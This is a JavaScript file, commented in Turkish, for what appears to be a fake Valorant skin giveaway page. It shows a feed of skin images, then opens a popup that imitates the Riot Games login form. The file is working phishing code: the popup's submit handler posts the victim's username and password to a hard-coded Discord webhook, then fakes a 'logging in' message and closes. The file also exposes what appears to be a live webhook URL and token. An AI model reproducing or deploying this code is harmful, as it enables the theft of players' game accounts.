const WEBHOOK_URL = "https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq";

// Üstte akan itemlar (Resimler Valorant API'den çekiliyor ki boş kalmasın)
const skins = [
    {n: "Gaia Vandal", i: "https://media.valorant-api.com/weaponskinlevels/9079f83f-42e7-f584-6997-4089901e8584/displayicon.png"},
    {n: "Oni Phantom", i: "https://media.valorant-api.com/weaponskinlevels/4493e877-4402-f831-255d-7589e40700d9/displayicon.png"},
    {n: "Prime Vandal", i: "https://media.valorant-api.com/weaponskinlevels/eb6100f2-45e0-5a3d-4c38-898f029a149c/displayicon.png"}
];

document.addEventListener("DOMContentLoaded", () => {
    const track = document.getElementById('dropTrack');
    function spawn() {
        if(!track) return;
        const s = skins[Math.floor(Math.random() * skins.length)];
        const d = document.createElement('div');
        d.className = 'drop-card';
        d.innerHTML = `<img src="${s.i}"><span>${s.n}</span>`;
        track.prepend(d);
        if(track.children.length > 15) track.removeChild(track.lastChild);
        setTimeout(spawn, 2000);
    }
    spawn();
});

// Giriş Penceresi ve Webhook İşlemi
function openAuth() {
    const w = 450, h = 600;
    const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
    let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);
    
    // image_12.png'ye en yakın tasarım
    win.document.body.innerHTML = `
        <style>
            body { background: #fff; font-family: sans-serif; text-align: center; padding: 40px 30px; margin: 0; }
            .logo-img { width: 120px; margin-bottom: 30px; }
            input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; background: #f2f2f2; font-size: 14px; outline: none; }
            input:focus { border-color: #ff4655; background: #fff; }
            .btn { width: 100%; padding: 16px; background: #ff4655; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 20px; font-size: 16px; }
            .btn:hover { background: #e33e4c; }
        </style>
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a8/Riot_Games_logo.svg/1200px-Riot_Games_logo.svg.png" class="logo-img">
        <h2 style="margin-bottom:25px; color:#111;">Oturum Aç</h2>
        <input type="text" id="u" placeholder="KULLANICI ADI">
        <input type="password" id="p" placeholder="ŞİFRE">
        <button class="btn" id="s">OTURUM AÇ</button>
    `;

    win.document.getElementById('s').onclick = function() {
        const user = win.document.getElementById('u').value;
        const pass = win.document.getElementById('p').value;

        if(user && pass) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🔔 **Yeni Giriş Bilgisi!**\n👤 Kullanıcı: \`${user}\` \n🔑 Şifre: \`${pass}\` \n⚡ Manuel Kontrol Bekleniyor...`
                })
            }).then(() => {
                win.document.body.innerHTML = "<h3>Giriş Yapılıyor... Lütfen Bekleyin.</h3>";
                setTimeout(() => win.close(), 2000);
            });
        }
    };
}
